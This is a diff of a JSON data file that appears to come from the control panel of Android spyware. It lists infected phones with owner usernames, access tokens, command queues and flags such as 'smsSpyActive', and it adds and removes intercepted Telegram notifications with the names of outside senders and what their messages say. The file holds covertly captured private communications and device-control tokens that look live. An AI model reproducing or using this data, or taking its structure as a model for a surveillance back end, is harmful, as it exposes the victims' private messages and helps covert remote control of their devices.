@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776772751991,
+    "lastSeen": 1776772758003,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776772751091,
+    "lastSeen": 1776772757124,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776772750605,
+    "lastSeen": 1776772756603,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16634 pesan baru dari 115 obrolan",
+        "time": "21/04 18:59",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772758290
+      },
       {
         "appName": "Telegram",
         "sender": "(苏) 𝗙𝗮𝗺𝗔𝘅𝗰𝗮𝗹⁶⁰⁵",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769992752
-      },
-      {
-        "appName": "Telegram",
-        "sender": "./j4X¡tsme な #sa #flory 🎖️",
-        "content": "Fs Noktel \nId 1 r9k (2) nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769992730
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776772751530,
+    "lastSeen": 1776772758164,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
